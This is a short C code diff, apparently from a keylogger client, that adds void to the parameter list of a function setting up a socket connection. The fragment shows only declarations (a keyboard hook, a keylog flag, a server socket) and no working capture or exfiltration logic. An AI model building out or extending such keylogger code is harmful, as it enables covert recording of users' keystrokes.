@@ -16,7 +16,7 @@ SOCKET server;
 HHOOK hook;
 int keylog_on = 1;
 
-static SOCKET init_client() {
+static SOCKET init_client(void) {
   AddrInfo *result, *ptr, hints;
   result = ptr = NULL;
   setaddrinfo(&hints, CLIENT);
